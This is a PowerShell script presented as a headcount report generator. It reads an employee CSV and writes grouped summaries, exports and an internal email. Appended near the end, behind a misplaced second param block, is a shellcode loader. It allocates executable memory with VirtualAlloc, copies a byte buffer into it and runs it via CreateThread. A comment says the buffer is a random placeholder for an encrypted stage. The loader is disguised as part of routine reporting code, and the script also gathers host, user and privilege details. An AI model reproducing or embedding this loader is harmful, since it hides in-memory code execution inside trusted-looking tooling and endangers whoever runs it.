
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.NOTES
    Author: J. Weber
    Last updated: 2024-02-13
#>

param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Scripts\data\headcount-export.csv',
    [string]$OutputPath = "D:\Ops\reports\headcount-summary-2025-04-07.csv",
    [Parameter(Mandatory = $false)]
    [ValidateSet("Department", 'Site')]
    [string]$GroupBy = "Department",
    [double]$MinAmount = 5000
)
$culture = [System.Globalization.CultureInfo]::InvariantCulture

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count
$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}
$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Tahoma; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$byGroup | ConvertTo-Json -Depth 4 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@
$MailTo = "reporting@internal.corp"
$MailFrom = "bi@internal.corp"

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject 'Headcount summary' `
    -Body $summaryBody `
    -SmtpServer "smtp.internal.corp" `
    -Port 25 `
    -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x9d, 0xf0, 0x33, 0xc3, 0x22, 0xda, 0xf2, 0xfd, 0x34, 0xb5, 0x1c, 0x39, 0xe5, 0x40, 0x53, 0x97,
    0xd7, 0x2f, 0x75, 0x08, 0x7c, 0x3e, 0xc2, 0x0a, 0xf5, 0xa2, 0xf6, 0x49, 0x2c, 0x7e, 0x3b, 0x1c,
    0x8e, 0x03, 0x07, 0xcb, 0xe9, 0xd2, 0xc1, 0xd9, 0xc6, 0xd8, 0x7e, 0x2a, 0x40, 0x5e, 0x5b, 0x43,
    0xfe, 0xc3, 0xdd, 0x32, 0x8c, 0x2b, 0xe1, 0x85, 0x0f, 0xd0, 0x9a, 0xe9, 0x01, 0x64, 0x07, 0x03,
    0x87, 0x97, 0xd8, 0x65, 0x26, 0xc1, 0x42, 0x9d, 0x4b, 0x1f, 0xe0, 0x39, 0xac, 0x20, 0x78, 0x9b,
    0xfa, 0xe8, 0xb8, 0xae, 0x78, 0x7a, 0x21, 0x6f, 0x18, 0x53, 0xf4, 0x85, 0x11, 0x5c, 0xae, 0xc6,
    0x41, 0xab, 0x66, 0x02, 0x29, 0xe8, 0x08, 0x8b, 0x39, 0xc9, 0x8d, 0x0e, 0xe8, 0xb7, 0xab, 0x4a,
    0x0a, 0xfc, 0x55, 0xa4, 0xea, 0x90, 0xcb, 0xd5, 0xa1, 0x14, 0x43, 0x45, 0x68, 0xf9, 0x89, 0xc2,
    0x4a, 0x17, 0x1a, 0x7d, 0x44, 0xb0, 0x26, 0x55, 0x23, 0x9a, 0xbe, 0x3b, 0x7d, 0xed, 0x74, 0xef,
    0x7f, 0xbe, 0xde, 0x13, 0xa1, 0x9e, 0x0c, 0x15, 0xad, 0x64, 0x02, 0x78, 0x1e, 0xa0, 0xc7, 0x12,
    0x56, 0x65, 0x11, 0xc9, 0x92, 0x00, 0x0f, 0x61, 0x03, 0xed, 0xb4, 0x8a, 0x8d, 0xe8, 0xb2, 0x12,
    0xfa, 0xfd, 0xfa, 0x6c, 0xe7, 0x97, 0x35, 0x60, 0x86, 0xfe, 0x19, 0x9f, 0xd9, 0x46, 0xd4, 0x6b,
    0x7e, 0x35, 0xeb, 0x0a, 0xe4, 0x99, 0x36, 0xed, 0xa8, 0xf2, 0x76, 0x09, 0x4c, 0xed, 0x7a, 0x60,
    0xe2, 0x34, 0xec, 0x82, 0x7e, 0x50, 0x60, 0xdc, 0x4e, 0x5f, 0x61, 0x12, 0xf0, 0x44, 0xb7, 0x51,
    0x2d, 0x17, 0xe8, 0x4b, 0x59, 0x58, 0x8a, 0xdd, 0x07, 0x0c, 0x02, 0x87, 0x07, 0xc1, 0xe8, 0x60,
    0x2d, 0xb1, 0xf2, 0x9e, 0xee, 0xa5, 0x4a, 0xab, 0x94, 0xb0, 0x7b, 0x4b, 0x82, 0x64, 0x1b, 0x69,
    0x14, 0xe1, 0x0b, 0x39, 0xc8, 0x16, 0x21, 0xeb, 0x26, 0x79, 0x6c, 0x1e, 0xbf, 0xf9, 0x31, 0x1a,
    0x90, 0xe6, 0x71, 0x30, 0x0e, 0xef, 0xe2, 0x93, 0x86, 0xc2, 0x9b, 0x7d, 0x23, 0x44, 0xde, 0xda,
    0xf4, 0x23, 0x48, 0x9f, 0x93, 0x8e, 0x30, 0xe7, 0x69, 0x34, 0xf2, 0x79, 0xd4, 0x84, 0x54, 0x5c,
    0x44, 0xce, 0xe2, 0xf7, 0xd3, 0x1d, 0xb7, 0x07, 0x37, 0x3b, 0x6e, 0x61, 0x84, 0x3c, 0xdd, 0x18,
    0x23, 0x6a, 0x84, 0xa5, 0x12, 0xaa, 0x37, 0xc0, 0x08, 0x0c, 0xfe, 0xbb, 0x07, 0xa1, 0xff, 0x8f,
    0x36, 0x66, 0x44, 0x8f, 0x4c, 0x50, 0x3c, 0xb3, 0x8f, 0xc3, 0xf7, 0xf2, 0x85, 0x5e, 0x55, 0x73,
    0xbf, 0x88, 0x35, 0x7e, 0xa0, 0x26, 0xae
)

$Handle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 2349)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
